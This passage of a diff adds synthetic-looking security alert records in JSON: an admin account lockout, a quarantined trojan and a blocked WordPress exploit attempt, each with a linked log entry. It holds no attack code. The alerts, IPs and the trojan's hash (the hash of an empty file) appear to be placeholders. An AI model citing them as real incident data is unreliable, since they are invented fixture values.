+    "source_ip": "104.223.45.67",
+    "destination_ip": "203.0.113.50",
+    "event_action": "locked",
+    "event_type": "authentication",
+    "user_name": "admin",
+    "linked_log": {
+      "log.original": "[AUTH] LOCKOUT account \"admin\" after 10 failed attempts from 104.223.45.67",
+      "@timestamp": "2024-01-12T12:30:12Z",
+      "event.action": "locked",
+      "event.type": "authentication",
+      "source.ip": "104.223.45.67",
+      "destination.ip": "203.0.113.50",
+      "user.name": "admin"
+    }
+  },
+  {
+    "alert_id": "e9f726e5b829",
+    "alert_type": "malware_signature",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:35:45Z",
+    "source_ip": "203.45.67.89",
+    "destination_ip": "203.0.113.50",
+    "event_action": "quarantined",
+    "event_type": "malware_detection",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[ANTIVIRUS] QUARANTINE trojan.exe (MD5: d41d8cd98f00b204e9800998ecf8427e) from 203.45.67.89",
+      "@timestamp": "2024-01-12T12:35:45Z",
+      "event.action": "quarantined",
+      "event.type": "malware_detection",
+      "source.ip": "203.45.67.89",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  },
+  {
+    "alert_id": "b3757d799723",
+    "alert_type": "exploit_attempt",
+    "severity": "low",
+    "timestamp": "2024-01-12T12:40:22Z",
+    "source_ip": "198.51.100.23",
+    "destination_ip": "203.0.113.50",
+    "event_action": "blocked",
+    "event_type": "exploit_attempt",
+    "user_name": "unknown",
+    "linked_log": {
+      "log.original": "[IDS] DENY WP_EXPLOIT from 198.51.100.23 to /wp-admin/admin-ajax.php",
+      "@timestamp": "2024-01-12T12:40:22Z",
+      "event.action": "blocked",
+      "event.type": "exploit_attempt",
+      "source.ip": "198.51.100.23",
+      "destination.ip": "203.0.113.50",
+      "user.name": "unknown"
+    }
+  }
+]
